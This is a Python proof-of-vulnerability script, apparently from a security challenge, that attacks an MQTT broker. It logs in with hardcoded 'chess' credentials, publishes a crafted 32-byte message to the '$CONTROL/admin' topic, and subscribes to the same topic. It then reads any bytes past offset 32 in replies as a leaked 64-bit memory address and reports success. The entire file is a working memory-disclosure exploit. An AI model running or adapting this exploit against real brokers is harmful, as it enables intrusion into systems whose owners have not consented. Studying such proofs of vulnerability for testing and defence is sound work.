import sys
import socket
import random
import time
import string
import base64
import os
import string
import struct
import signal
from threading import Thread

import paho
import paho.mqtt.publish as publish
import paho.mqtt.subscribe as subscribe
import paho.mqtt.client as mqtt

pwd = ''
homedir = ''

def handler( signum, frame):
    print('[FAIL] sigalrm fired so the POV was likely unsuccessful')
    exit(1)

class SubThread(Thread):
    def __init__(self, HOST):
        Thread.__init__(self)
        self.host = HOST

    def on_message(self, client, userdata, message):
        payload = message.payload

        print("Received message '" + str(payload) + "' on topic '"
                + message.topic + "' with QoS " + str(message.qos))

        if len(payload) > 32:
            remainder = payload[32:]

            remainder += b'\x00' * (8 - len(remainder))
            address = struct.unpack('Q', remainder)[0]
            print('[ADDRESS] %x' %(address))

            exit(0)

    def on_connect(self, mqttc, obj, flags, rc):
        print("Connected: " + str(rc))

    def run(self):
        mqttc = mqtt.Client()
        mqttc.on_message = self.on_message
        mqttc.on_connect = self.on_connect

        mqttc.username_pw_set('chess', 'chess')
        mqttc.connect(self.host, 1883, 60)
        mqttc.subscribe("$CONTROL/admin", 0)
        mqttc.loop_forever()

class PubThread(Thread):
    def __init__(self, HOST):
        Thread.__init__(self)
        self.host = HOST

    def run(self):
        try:
            publish.single('$CONTROL/admin', payload='a'*31 + 'b', hostname=self.host, auth={'username':'chess', 'password':'chess'}, qos=2 )

            publish.single('$CONTROL/admin', payload='a'*31 + 'b', hostname=self.host, auth={'username':'chess', 'password':'chess'}, qos=2 )
        except (paho.mqtt.MQTTException) as e:
            return 0

        return 1

def publish_message(host, port, user, password):
    try:
        publish.single('$CONTROL/admin', payload='a'*31 + 'b', hostname=host, auth={'username':user, 'password':password} )
    except (paho.mqtt.MQTTException) as e:
        return 0

    return 1

def main():
    if len(sys.argv) == 3:
        HOST = sys.argv[1]
        PORT = int(sys.argv[2])
    else:
        if 'HOST' in os.environ and 'PORT' in os.environ:
            HOST = os.environ['HOST']
            PORT = int(os.environ['PORT'])
        else:
            print('[ERROR] HOST and PORT must be specified via arguments or variables.')
            sys.exit(1)

    signal.signal(signal.SIGALRM, handler)
    signal.alarm(20)
    
    subThread = SubThread(HOST)
    subThread.start()

    pubThread = PubThread(HOST)
    pubThread.start()

    pubThread.join()
    subThread.join()

    print('[SUCCESS] POV completed successfully')

if __name__ == '__main__':
    main()
